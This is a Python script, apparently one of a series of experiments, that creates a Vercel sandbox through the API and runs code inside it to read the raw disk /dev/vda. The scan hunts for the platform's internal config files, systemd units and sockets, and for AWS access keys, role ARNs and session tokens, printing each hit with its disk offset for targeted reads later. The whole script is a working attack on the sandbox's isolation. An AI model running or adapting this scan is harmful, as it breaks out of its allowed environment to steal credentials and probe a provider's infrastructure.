# 实验J27: vda 分段扫描(512MB-12GB) 带偏移 - 定位 celld.toml/systemd unit/配置
# J26: celld.toml xkernel.toml 在目录块出现但未记录偏移; 全盘扫超时
# 目标: 命中带绝对偏移 -> 定向读文件内容
import json, base64, pathlib, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj27"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# [1] 分段扫 512MB-12GB, 命中带偏移
SCAN1 = r'''
import re, time
PAT = re.compile(rb"(celld|xkernel|\.toml|\.service|ExecStart|cell\.sock|apm\.sock|metrics\.sock|containerd\.sock|AKIA[0-9A-Z]{12}|ASIA[0-9A-Z]{12}|role_arn|access[_-]?key|secret[_-]?key|session[_-]?token)", re.I)
hits = []
t0 = time.time()
CH = 64*1024*1024
base = 512*1024*1024
with open("/dev/vda", "rb") as f:
    f.seek(base)
    pos = base
    while pos < 12*1024*1024*1024:
        d = f.read(CH)
        if not d:
            break
        for mm in PAT.finditer(d):
            s = max(0, mm.start()-100); e = min(len(d), mm.end()+300)
            ctx = d[s:e]
            key = ctx[:40]
            if any(key == h[1] for h in hits):
                continue
            hits.append((pos+mm.start(), key))
            if len(hits) >= 120:
                break
        pos += len(d)
        if len(hits) >= 120:
            break
print("scanned to", round(pos/1024/1024/1024,1), "GB in", round(time.time()-t0,1), "s hits:", len(hits), flush=True)
for off, key in hits:
    f = open("/dev/vda","rb")
    f.seek(max(0,off-150))
    ctx = f.read(450)
    f.close()
    t = re.sub(rb"[\x00-\x08\x0b-\x1f]", b" ", ctx).decode(errors="replace")
    t = re.sub(r"\s+", " ", t)
    print(f"OFF={off} :: {t[:260]}", flush=True)
'''
run_cmd(sid, SCAN1, "seg1", wait=True, timeout=190000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
